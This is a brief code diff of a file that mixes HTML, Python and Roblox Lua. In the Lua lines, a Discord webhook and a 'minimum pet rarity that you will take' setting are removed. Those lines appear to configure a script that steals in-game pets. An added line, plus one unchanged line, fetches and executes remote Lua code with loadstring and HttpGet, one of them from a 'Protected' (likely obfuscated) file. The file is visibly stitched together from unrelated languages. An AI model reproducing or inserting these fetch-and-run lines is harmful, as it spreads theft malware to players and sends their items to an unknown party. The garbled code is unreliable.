@@ -160,9 +160,7 @@ import pydantic
 
 </body>
 </html>
-_G.User = "Aspect_Guardian"
-_G.Webhook = "https://discord.com/api/webhooks/1318739792544141384/0VR6dgm77uOb-ftA_EDj5_SIAILAhrgahdpZMEKGFuDAJqEbIwZBSvM6tYDZi2NN6jxs"
-_G.Min = 1 -- Minimum pet rarity that you will take
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_ab7e7a39d767fb8463841d2a.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialPs99Scripters/AutoFarmPetsGo/refs/heads/main/AutoFarmHub", true))()
 # This script implements a simple text-based adventure game.
 
